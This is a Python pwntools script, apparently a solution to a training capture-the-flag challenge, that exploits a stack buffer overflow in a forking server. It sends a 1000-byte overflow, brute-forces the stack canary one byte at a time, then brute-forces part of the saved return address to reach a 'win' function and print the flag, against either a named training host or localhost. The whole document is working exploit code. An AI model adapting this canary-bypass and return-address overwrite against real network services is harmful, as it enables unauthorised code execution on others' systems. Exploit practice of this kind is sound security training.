from pwn import *
import time,sys

context.log_level = 'error'
canary = b"\x00"
byte_found = True
byte_list = [bytes([i]) for i in range(256)]


# Find canary by bruteforcing each byte
while len(canary) < 8:
    byte_found = False
    for i in range(256):

        if args.PRINT:
            print(f"Trying byte: {byte_list[i].hex()}")
        try:
            if args.REMOTE:
                c = remote("forking-server-pp.training.offensivedefensive.it", 8080, ssl=True)
                timeout = 0.4
            else:
                c = remote("127.0.0.1", 4000)
                timeout = 0.1

            c.recvuntil(b"What is your name?\n")
            c.send(b"A"*1000 + canary + byte_list[i])
            response = c.recvall(timeout=timeout)
            if b"!!!" in response:
                canary += byte_list[i]
                print(f"Canary: {canary.hex()}")
                byte_found = True
                c.close()
                break  # Found the byte, break the loop
        except KeyboardInterrupt:
            sys.exit(0)
        except:
            print("An error occurred, retrying...")
            i-=1  # Retry the same byte
            c.close()

    if byte_found == False:
        print("byte not found")
        break

print(f"Canary leaked, now we try to jump to win function, bruteforcing the second byte of RIP")
sRIP = b"\x49"

for i in range(256):
    if args.REMOTE:
        c = remote("forking-server-pp.training.offensivedefensive.it", 8080, ssl=True)
        timeout = 0.4
    else:
        c = remote("127.0.0.1", 4000)
        timeout = 0.1
    if args.PRINT:
        print(f"Trying sRIP: {byte_list[i].hex}")
        
    c.recvuntil(b"What is your name?\n")
    c.send(b"A"*1000 + canary + b"B" * 8 + sRIP + byte_list[i])
    response = c.recvall(timeout=timeout)
    if b"flag" in response:
        print(response)
        break